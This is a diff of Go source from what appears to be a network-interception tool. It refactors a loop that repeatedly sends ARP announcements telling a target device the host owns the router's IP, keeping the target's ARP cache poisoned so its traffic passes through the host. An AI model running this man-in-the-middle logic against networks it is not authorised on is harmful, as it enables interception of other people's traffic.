@@ -64,7 +64,9 @@ func (h *Handler) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
 //
 func (h *Handler) spoofLoop(addr packet.Addr) {
 
+	// The client ARP table is refreshed often and only last for a short while (few minutes)
 	// 4 second re-arp seem to be adequate;
+	// To make sure the cache stays poisoned, replay every few seconds with a loop.
 	// Experimented with 300ms but no noticeable improvement other the chatty net.
 	ticker := time.NewTicker(time.Second * 6).C
 	startTime := time.Now()
@@ -76,17 +78,24 @@ func (h *Handler) spoofLoop(addr packet.Addr) {
 
 		if !hunting || h.closed {
 			fmt.Printf("arp   : hunt loop stop %s repeat=%v duration=%v\n", addr, nTimes, time.Since(startTime))
-			if err := h.announce(addr.MAC, h.session.NICInfo.RouterAddr4, EthernetBroadcast); err != nil {
+			// clear the arp table
+			if err := h.request(addr.MAC, h.session.NICInfo.RouterAddr4, packet.Addr{MAC: EthernetBroadcast, IP: h.session.NICInfo.RouterAddr4.IP}); err != nil {
 				fmt.Printf("arp error send announcement packet %s: %s\n", addr, err)
 			}
 			return
 		}
 
 		// Re-arp target to change router to host so all traffic comes to us
+		// Announce to target that we own the router IP
+		// This will update the target arp table with our mac
 		// i.e. tell target I am 192.168.0.1
 		//
 		// Use virtual IP as it is guaranteed to not change.
-		h.forceSpoof(targetAddr)
+		err := h.AnnounceTo(targetAddr.MAC, h.session.NICInfo.RouterIP4.IP)
+		if err != nil {
+			fmt.Printf("arp   : error send announcement packet %s: %s\n", targetAddr, err)
+			return
+		}
 
 		if nTimes%16 == 0 {
 			fmt.Printf("arp   : hunt loop attack %s repeat=%v duration=%s\n", targetAddr, nTimes, time.Since(startTime))
@@ -99,36 +108,4 @@ func (h *Handler) spoofLoop(addr packet.Addr) {
 		case <-ticker:
 		}
 	}
-}
-
-// forceSpoof send announcement and gratuitous ARP packet to spoof client MAC arp table to send router packets to
-// host instead of the router
-// i.e.  192.168.0.1->RouterMAC becames 192.168.0.1->HostMAC
-//
-// The client ARP table is refreshed often and only last for a short while (few minutes)
-// hence the goroutine that re-arp clients
-// To make sure the cache stays poisoned, replay every few seconds with a loop.
-func (h *Handler) forceSpoof(addr packet.Addr) error {
-
-	// Announce to target that we own the router IP
-	// This will update the target arp table with our mac
-	err := h.announce(addr.MAC, packet.Addr{MAC: h.session.NICInfo.HostMAC, IP: h.session.NICInfo.RouterIP4.IP}, EthernetBroadcast)
-	if err != nil {
-		fmt.Printf("arp error send announcement packet %s: %s\n", addr, err)
-		return err
-	}
-
-	/***
-	// Send 1 unsolicited ARP reply; clients may discard this
-	for i := 0; i < 1; i++ {
-		err = h.reply(addr.MAC, h.session.NICInfo.HostMAC, h.session.NICInfo.RouterIP4.IP, addr.MAC, addr.IP)
-		if err != nil {
-			fmt.Printf("arp error spoof client %s: %s\n", addr, err)
-			return err
-		}
-		time.Sleep(time.Millisecond * 10)
-	}
-	***/
-
-	return nil
 }
